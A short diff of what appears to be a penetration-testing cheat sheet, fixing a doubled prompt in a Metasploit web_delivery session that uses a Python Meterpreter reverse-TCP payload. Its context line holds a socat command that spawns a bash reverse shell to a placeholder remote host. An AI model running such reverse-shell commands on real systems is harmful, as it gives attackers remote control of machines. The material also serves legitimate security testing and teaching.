@@ -26,7 +26,7 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<RHOST>:<RPORT>
 
 ```bash
 $ msfconsole -q                                
-msf6 > msf6 > use multi/script/web_delivery
+msf6 > use multi/script/web_delivery
 [*] Using configured payload python/meterpreter/reverse_tcp
 msf6 exploit(multi/script/web_delivery) > show targets
 
